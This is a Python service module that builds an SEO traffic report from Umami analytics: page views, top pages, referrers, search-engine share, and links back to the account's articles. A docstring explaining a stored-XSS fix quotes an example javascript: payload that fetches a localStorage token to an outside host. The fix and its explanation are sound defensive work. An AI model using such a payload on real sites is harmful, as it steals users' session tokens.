"""Which content brings people to the DoAide sites, read from Umami.

Per site in :mod:`app.services.seo_sites`: page views and visitors over the
window, the top pages, and the top referrers — with the share that came from a
search engine, which is the number SEO work is meant to move.

Pages are tied back to Pulse content where they can be: a page whose URL is
the canonical URL, or a publication URL, of one of the account's pieces is
reported with that piece's id and title. Pages under a blog-like path are
marked as content even when Pulse did not write them, so a hand-written guide
that ranks still shows up in "what content drives traffic".

Umami calls go through the same client, site-id lookup and cache TTL as the
cross-product dashboard, and are made server-side only.
"""
from __future__ import annotations

import logging
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlsplit

from sqlalchemy import select
from sqlalchemy.orm import Session

from app.logging_config import carrying_context
from app.models.content import Content
from app.models.mixins import utcnow
from app.models.project import Project
from app.models.publication import Publication
from app.services import product_activity
from app.services.seo_sites import SITES, Site
from app.services.umami import UmamiClient, UmamiError, get_client

logger = logging.getLogger(__name__)

TOP_PAGES = 25
TOP_REFERRERS = 10
TOP_CONTENT = 20
#: Path prefixes that mean "this is an article", whoever wrote it.
CONTENT_PREFIXES = ("/blog/", "/article/", "/articles/", "/posts/", "/guides/", "/learn/")
SEARCH_ENGINES = ("google.", "bing.", "duckduckgo.", "yahoo.", "yandex.", "ecosia.", "baidu.")

_cache: dict[tuple, tuple[float, dict]] = {}
_cache_lock = threading.Lock()



def _page_link(domain: str, path: str) -> str | None:
    """The link the traffic panel draws for a page path from Umami, or ``None``.

    A path that was not a path used to be passed through as the link itself.
    Umami's collect endpoint is public — any page can report any URL for a
    tracked site — so ``javascript:fetch('//x/?'+localStorage.token)`` sent
    there came back here as ``href``, in a panel only the operator opens, on
    the origin that holds their session. Only an absolute path or an http(s)
    URL is a link; anything else is shown as text.
    """
    if path.startswith("/") and not path.startswith("//"):
        return f"https://{domain}{path}"
    if path.lower().startswith(("https://", "http://")):
        return path
    return None

def clear_cache() -> None:
    """Forget every cached Umami answer."""
    with _cache_lock:
        _cache.clear()


def is_search_engine(referrer: str) -> bool:
    """Whether a referrer (URL or bare host) is a known search engine."""
    host = (urlsplit(referrer).hostname if "//" in referrer else referrer.split("/")[0]) or ""
    host = host.lower()
    return any(f".{engine}" in f".{host}" for engine in SEARCH_ENGINES)


def _normal_path(path: str) -> str:
    path = urlsplit(path).path if "//" in path else path.split("?")[0]
    return path.rstrip("/") or "/"


def content_index(db: Session, user_id: int) -> dict[tuple[str, str], dict]:
    """``(host, path) → piece`` for every URL one of the account's pieces lives at."""
    pieces = db.execute(
        select(Content.id, Content.title, Content.canonical_url)
        .join(Project, Project.id == Content.project_id)
        .where(Project.user_id == user_id)
    ).all()
    titles = {p.id: p.title for p in pieces}
    urls: list[tuple[int, str | None]] = [(p.id, p.canonical_url) for p in pieces]
    if titles:
        urls += db.execute(
            select(Publication.content_id, Publication.external_url).where(
                Publication.content_id.in_(titles), Publication.external_url.is_not(None)
            )
        ).all()
    index: dict[tuple[str, str], dict] = {}
    for content_id, url in urls:
        parts = urlsplit(url or "")
        if parts.hostname:
            index[(parts.hostname.lower(), _normal_path(parts.path))] = {
                "content_id": content_id,
                "title": titles[content_id],
            }
    return index


def _site_traffic(client: UmamiClient, site: Site, website_id: str, days: int) -> dict:
    key = (site.key, website_id, days)
    with _cache_lock:
        hit = _cache.get(key)
    if hit and time.monotonic() - hit[0] < product_activity.cache_seconds_for(hit[1]):
        return hit[1]
    if not website_id:
        return {"status": "not_found", "error": f"No Umami site for {site.domain}"}

    end_ms = int(time.time() * 1000)
    start_ms = end_ms - days * 86_400_000
    try:
        stats = client.stats(website_id, start_ms, end_ms)
        pages = client.metrics(website_id, start_ms, end_ms, type="url", limit=TOP_PAGES)
        try:
            referrers = client.metrics(
                website_id, start_ms, end_ms, type="referrer", limit=TOP_REFERRERS
            )
        except UmamiError:
            referrers = []
    except UmamiError as exc:
        logger.warning("umami traffic: %s (%s) failed: %s", site.key, website_id, exc)
        # Kept briefly, as the products dashboard keeps one: see
        # ``product_activity.ERROR_CACHE_SECONDS``.
        failed = {"status": "error", "error": str(exc)}
        with _cache_lock:
            _cache[key] = (time.monotonic(), failed)
        return failed
    result = {
        "status": "ok",
        "pageviews": stats["pageviews"],
        "visitors": stats["visitors"],
        "pages": pages,
        "referrers": referrers,
    }
    with _cache_lock:
        _cache[key] = (time.monotonic(), result)
    return result


def traffic(
    db: Session,
    user_id: int,
    *,
    days: int,
    force: bool = False,
    client: UmamiClient | None = None,
) -> dict:
    """Umami traffic over ``days`` for each site the account owns, with search
    referrers and the account's own articles picked out."""
    client = client or get_client()
    if not client.configured:
        return {
            "days": days,
            "generated_at": utcnow(),
            "umami_configured": False,
            "umami_error": "Umami is not configured (set UMAMI_USERNAME and UMAMI_PASSWORD).",
            "totals": {"pageviews": 0, "visitors": 0, "search_visits": 0},
            "sites": [],
            "top_content": [],
        }
    if force:
        clear_cache()
        product_activity.clear_cache()

    umami_error = None
    try:
        ids = product_activity.website_ids(client)
    except UmamiError as exc:
        ids, umami_error = {}, str(exc)
    with ThreadPoolExecutor(max_workers=6) as pool:
        futures = {
            site.key: pool.submit(
                carrying_context(_site_traffic), client, site, ids.get(site.domain, ""), days
            )
            for site in SITES
        }
        raw = {key: f.result() for key, f in futures.items()}

    index = content_index(db, user_id)
    sites: list[dict] = []
    # Keyed by (site, normalised path): Umami counts "/blog/x" and "/blog/x/"
    # as two pages, and a ranking that lists one article twice with its views
    # split between the copies ranks it below pieces it outperformed.
    everything: dict[tuple[str, str], dict] = {}
    totals = {"pageviews": 0, "visitors": 0, "search_visits": 0}
    for site in SITES:
        r = raw[site.key]
        if r["status"] != "ok":
            sites.append({"key": site.key, "name": site.name, "domain": site.domain, **r})
            continue
        pages = []
        for path, views in r["pages"]:
            normal = _normal_path(path)
            piece = index.get((site.domain, normal))
            page = {
                "path": path,
                "url": _page_link(site.domain, path),
                "views": views,
                "is_content": piece is not None or normal.startswith(CONTENT_PREFIXES),
                "content_id": piece["content_id"] if piece else None,
                "title": piece["title"] if piece else None,
            }
            pages.append(page)
            if page["is_content"]:
                seen = everything.get((site.key, normal))
                if seen is None:
                    everything[(site.key, normal)] = {
                        **page, "site_key": site.key, "domain": site.domain
                    }
                else:
                    seen["views"] += views
        referrers = [
            {"referrer": name, "visits": n, "search": is_search_engine(name)}
            for name, n in r["referrers"]
        ]
        search_visits = sum(x["visits"] for x in referrers if x["search"])
        sites.append(
            {
                "key": site.key,
                "name": site.name,
                "domain": site.domain,
                "status": "ok",
                "error": None,
                "pageviews": r["pageviews"],
                "visitors": r["visitors"],
                "search_visits": search_visits,
                "top_pages": pages,
                "referrers": referrers,
            }
        )
        totals["pageviews"] += r["pageviews"]
        totals["visitors"] += r["visitors"]
        totals["search_visits"] += search_visits

    sites.sort(key=lambda s: (s["status"] != "ok", -s.get("pageviews", 0), s["name"]))
    ranked = sorted(everything.values(), key=lambda p: -p["views"])
    return {
        "days": days,
        "generated_at": utcnow(),
        "umami_configured": True,
        "umami_error": umami_error,
        "totals": totals,
        "sites": sites,
        "top_content": ranked[:TOP_CONTENT],
    }
